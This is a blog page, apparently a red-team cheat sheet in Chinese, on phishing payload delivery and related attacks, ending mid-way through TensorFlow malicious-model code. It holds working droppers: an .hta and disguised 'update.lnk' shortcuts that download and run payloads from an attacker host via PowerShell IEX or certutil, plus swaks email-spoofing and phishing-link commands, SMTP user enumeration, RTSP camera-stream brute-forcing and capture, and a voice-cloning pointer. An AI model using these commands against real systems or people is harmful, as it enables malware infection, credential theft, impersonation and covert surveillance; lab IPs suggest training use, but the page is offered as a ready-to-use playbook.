@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="钓鱼相关-投放器构造-载荷构造\r.hta加载js源码\r（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）\n&lt;html&gt; &lt;head&gt; &lt;script language=&#34;JScript&#34;&gt; var shell = new ActiveXObject(&#34;WScript.Shell&#34;); shell.Run(&#34;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://攻击机IP/shell.ps1&#39;)&#34;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt;self.close();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; lnk投放（快捷方式-命令执行）\r首先需要在测试环境生成\n加载反射源码\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c `&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.174.129:88/shell.ps1&#39;)`&#34;&#34; $Shortcut.WindowStyle = 7 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,3&#34; $Shortcut.Save() 远程下载木马执行（无powershell）\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c certutil -urlcache -split -f http://192.168.174.129:88/fuck.exe C:\\Windows\\Tasks\\fuck.exe &amp;&amp; C:\\Windows\\Tasks\\fuck.exe&#34; $Shortcut.WindowStyle = 7 # 最小化窗口 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,23&#34; # 文档图标 $Shortcut.Save() 也可以利用下面的命令反向查找lnk文件指向\n">
+<title>渊蜂之书</title>
+
+<link rel='canonical' href='https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="渊蜂之书">
+<meta property='og:description' content="钓鱼相关-投放器构造-载荷构造\r.hta加载js源码\r（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）\n&lt;html&gt; &lt;head&gt; &lt;script language=&#34;JScript&#34;&gt; var shell = new ActiveXObject(&#34;WScript.Shell&#34;); shell.Run(&#34;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://攻击机IP/shell.ps1&#39;)&#34;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt;self.close();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; lnk投放（快捷方式-命令执行）\r首先需要在测试环境生成\n加载反射源码\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c `&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.174.129:88/shell.ps1&#39;)`&#34;&#34; $Shortcut.WindowStyle = 7 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,3&#34; $Shortcut.Save() 远程下载木马执行（无powershell）\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c certutil -urlcache -split -f http://192.168.174.129:88/fuck.exe C:\\Windows\\Tasks\\fuck.exe &amp;&amp; C:\\Windows\\Tasks\\fuck.exe&#34; $Shortcut.WindowStyle = 7 # 最小化窗口 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,23&#34; # 文档图标 $Shortcut.Save() 也可以利用下面的命令反向查找lnk文件指向\n">
+<meta property='og:url' content='https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/'>
+<meta property='og:site_name' content='wackymaker'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='社之魔法' /><meta property='article:published_time' content='2025-08-23T21:25:37&#43;08:00'/><meta property='article:modified_time' content='2025-08-23T21:25:37&#43;08:00'/>
+<meta name="twitter:title" content="渊蜂之书">
+<meta name="twitter:description" content="钓鱼相关-投放器构造-载荷构造\r.hta加载js源码\r（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）\n&lt;html&gt; &lt;head&gt; &lt;script language=&#34;JScript&#34;&gt; var shell = new ActiveXObject(&#34;WScript.Shell&#34;); shell.Run(&#34;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://攻击机IP/shell.ps1&#39;)&#34;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt;self.close();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; lnk投放（快捷方式-命令执行）\r首先需要在测试环境生成\n加载反射源码\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c `&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.174.129:88/shell.ps1&#39;)`&#34;&#34; $Shortcut.WindowStyle = 7 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,3&#34; $Shortcut.Save() 远程下载木马执行（无powershell）\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c certutil -urlcache -split -f http://192.168.174.129:88/fuck.exe C:\\Windows\\Tasks\\fuck.exe &amp;&amp; C:\\Windows\\Tasks\\fuck.exe&#34; $Shortcut.WindowStyle = 7 # 最小化窗口 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,23&#34; # 文档图标 $Shortcut.Save() 也可以利用下面的命令反向查找lnk文件指向\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_6baab66dae07af16.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">wackymaker</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/wackymaker'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#hta加载js源码">.hta加载js源码</a></li>
+    <li><a href="#lnk投放快捷方式-命令执行">lnk投放（快捷方式-命令执行）</a></li>
+    <li><a href="#wsh载荷构筑js载荷构筑csharp载荷转换js">wsh载荷构筑（js载荷构筑，csharp载荷转换js）</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#smtp枚举用户名">smtp枚举用户名</a></li>
+    <li><a href="#邮件钓鱼-投放载荷or恶意链接">邮件钓鱼-投放载荷or恶意链接</a>
+      <ul>
+        <li><a href="#swaks-邮件伪造">swaks-邮件伪造</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#rstp服务利用">rstp服务利用</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#ai语音克隆">ai语音克隆</a></li>
+    <li><a href="#tensorflow投毒">tensorflow投毒</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#linux抓取挂载usb所有信息">linux抓取挂载usb所有信息</a>
+      <ul>
+        <li><a href="#利用">利用</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/" >
+                魔法书
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/">渊蜂之书</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 23, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    3 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="钓鱼相关-投放器构造-载荷构造">钓鱼相关-投放器构造-载荷构造
+</h1><h2 id="hta加载js源码">.hta加载js源码
+</h2><p>（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>&lt;html&gt;
+</span></span><span style="display:flex;"><span>&lt;head&gt;
+</span></span><span style="display:flex;"><span>&lt;script language<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;JScript&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  var shell <span style="color:#f92672">=</span> new ActiveXObject<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;WScript.Shell&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>  shell.Run<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://攻击机IP/shell.ps1&#39;)&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>&lt;/script&gt;
+</span></span><span style="display:flex;"><span>&lt;/head&gt;
+</span></span><span style="display:flex;"><span>&lt;body&gt;
+</span></span><span style="display:flex;"><span>&lt;script&gt;self.close<span style="color:#f92672">()</span>;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><h2 id="lnk投放快捷方式-命令执行">lnk投放（快捷方式-命令执行）
+</h2><p>首先需要在测试环境生成</p>
+<p>加载反射源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$WshShell = New-Object -ComObject WScript.Shell
+</span></span><span style="display:flex;"><span>$Shortcut = $WshShell.CreateShortcut(<span style="color:#e6db74">&#34;</span>$env:USERPROFILE<span style="color:#e6db74">\Desktop\update.lnk&#34;</span>)
+</span></span><span style="display:flex;"><span>$Shortcut.TargetPath = <span style="color:#e6db74">&#34;cmd.exe&#34;</span>
+</span></span><span style="display:flex;"><span>$Shortcut.Arguments = <span style="color:#e6db74">&#34;/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c </span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.174.129:88/shell.ps1&#39;)</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>$Shortcut.WindowStyle = <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>$Shortcut.IconLocation = <span style="color:#e6db74">&#34;C:\Windows\System32\shell32.dll,3&#34;</span>
+</span></span><span style="display:flex;"><span>$Shortcut.Save()
+</span></span></code></pre></div><p>远程下载木马执行（无powershell）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$WshShell = New-Object -ComObject WScript.Shell
+</span></span><span style="display:flex;"><span>$Shortcut = $WshShell.CreateShortcut(<span style="color:#e6db74">&#34;</span>$env:USERPROFILE<span style="color:#e6db74">\Desktop\update.lnk&#34;</span>)
+</span></span><span style="display:flex;"><span>$Shortcut.TargetPath = <span style="color:#e6db74">&#34;cmd.exe&#34;</span>
+</span></span><span style="display:flex;"><span>$Shortcut.Arguments = <span style="color:#e6db74">&#34;/c certutil -urlcache -split -f http://192.168.174.129:88/fuck.exe C:\Windows\Tasks\fuck.exe &amp;&amp; C:\Windows\Tasks\fuck.exe&#34;</span>
+</span></span><span style="display:flex;"><span>$Shortcut.WindowStyle = <span style="color:#ae81ff">7</span>  <span style="color:#75715e"># 最小化窗口</span>
+</span></span><span style="display:flex;"><span>$Shortcut.IconLocation = <span style="color:#e6db74">&#34;C:\Windows\System32\shell32.dll,23&#34;</span>  <span style="color:#75715e"># 文档图标</span>
+</span></span><span style="display:flex;"><span>$Shortcut.Save()
+</span></span></code></pre></div><p>也可以利用下面的命令反向查找lnk文件指向</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -c <span style="color:#e6db74">&#34;</span>$sh<span style="color:#e6db74"> = New-Object -ComObject WScript.Shell; </span>$sh<span style="color:#e6db74">.CreateShortcut(&#39;.\target.lnk&#39;).TargetPath&#34;</span>
+</span></span></code></pre></div><h2 id="wsh载荷构筑js载荷构筑csharp载荷转换js">wsh载荷构筑（js载荷构筑，csharp载荷转换js）
+</h2><p>dontnettojscript 转换命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>DotNetToJScript.exe ExampleAssembly.dll --lang<span style="color:#f92672">=</span>jscript --var<span style="color:#f92672">=</span>v4 -o shell.js
+</span></span></code></pre></div><h1 id="邮件方向利用">邮件方向利用
+</h1><h2 id="smtp枚举用户名">smtp枚举用户名
+</h2><p>使用工具</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>github.com/cytopia/smtp-user-enum?tab<span style="color:#f92672">=</span>readme-ov-file#smiling_imp-vrfy-mode-default
+</span></span></code></pre></div><p>RCPT TO模式（指点收件人发送，模拟正常邮件）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>smtp-user-enum -U /home/wackymaker/tools/dic/userNameDict/multiplesources-users-fabian-fingerle.de.txt -D $domain -t $ip -m $线程数 -p $port -M RCPT
+</span></span></code></pre></div><p>VRFY模式(默认的直接测试模式)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>smtp-user-enum -U /home/wackymaker/tools/dic/userNameDict/multiplesources-users-fabian-fingerle.de.txt -D $domain -t $ip -m $线程数 -p $port
+</span></span></code></pre></div><h2 id="邮件钓鱼-投放载荷or恶意链接">邮件钓鱼-投放载荷or恶意链接
+</h2><p>一般需要将各种模式都测试一下</p>
+<h3 id="swaks-邮件伪造">swaks-邮件伪造
+</h3><h4 id="附带文件">附带文件
+</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>swaks --to jobs@cowmotors-int.com --from amit@rocks.com --header <span style="color:#e6db74">&#34;Subject: My CV&#34;</span> --body <span style="color:#e6db74">&#34;Attached my CV to this mail, thank you!&#34;</span> --attach @rev.doc --server 192.168.209.201
+</span></span></code></pre></div><h4 id="钓鱼链接">钓鱼链接
+</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>swaks --body <span style="color:#e6db74">&#39;Please click here http://192.168.45.164/payload.hta&#39;</span> --add-header <span style="color:#e6db74">&#34;MIME-Version: 1.0&#34;</span> --add-header <span style="color:#e6db74">&#34;Content-Type:text/html&#34;</span> --header <span style="color:#e6db74">&#34;Subject: Issues with mail&#34;</span> --to Will@tricky.com --from will01@tricky.com --server 192.168.105.159
+</span></span></code></pre></div><h1 id="摄像头方向利用">摄像头方向利用
+</h1><h2 id="rstp服务利用">rstp服务利用
+</h2><p>如果侦测到存在rstp服务，也就是实时视频流服务，例如</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/prolab/fullhouse/10.0.52.5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -p 22,554 -sC -sV $ip
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-06-07 10:33 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.0.52.5
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.063s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh     OpenSSH 9.3 <span style="color:#f92672">(</span>FreeBSD 20230316; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> da:27:2d:b4:15:43:bf:71:21:50:a8:b5:e7:3f:fa:10 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> fb:cf:94:03:5b:a4:1c:85:b4:51:94:26:7c:cf:6e:0f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> f6:0d:01:16:88:0f:c5:45:8d:67:6d:f3:63:11:8f:7c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>554/tcp open  rtsp    GStreamer rtspd
+</span></span><span style="display:flex;"><span>|_rtsp-methods: OPTIONS, DESCRIBE, ANNOUNCE, GET_PARAMETER, PAUSE, PLAY, RECORD, SETUP, SET_PARAMETER, TEARDOWN
+</span></span><span style="display:flex;"><span>Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.96 seconds
+</span></span></code></pre></div><p>利用nmap脚本爆破无认证路径</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>脚本获取
+</span></span><span style="display:flex;"><span>https://blog.victormendonca.com/2018/02/09/how-to-scan-for-rtsp-urls/
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nmap --script rtsp-url-brute.nse -p <span style="color:#ae81ff">554</span> $ip -T2
+</span></span></code></pre></div><p>如果爆破出路径例下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>└─$ nmap --script rtsp-url-brute.nse -p <span style="color:#ae81ff">554</span> 10.0.52.5 -T2
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-06-07 11:05 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.0.52.5
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.27s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>554/tcp open  rtsp
+</span></span><span style="display:flex;"><span>| rtsp-url-brute: 
+</span></span><span style="display:flex;"><span>|   discovered: 
+</span></span><span style="display:flex;"><span>|_    rtsp://10.0.52.5/mpeg4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 59.19 seconds
+</span></span></code></pre></div><p>就可以利用ffmpeg截取视频流</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ffmpeg -rtsp_transport tcp -i rtsp://1$ip/mpeg4 -c copy out.mp4
+</span></span></code></pre></div><h1 id="ai方向利用">ai方向利用
+</h1><h2 id="ai语音克隆">ai语音克隆
+</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>好用的网站
+</span></span><span style="display:flex;"><span>https://app.play.ht/home（付费下载）
+</span></span><span style="display:flex;"><span>https://fish.audio（免费）
+</span></span></code></pre></div><h2 id="tensorflow投毒">tensorflow投毒
+</h2><p>文章如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model
+</span></span></code></pre></div><p>示例生成模型代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> tensorflow <span style="color:#66d9ef">as</span> tf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(x):
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> os
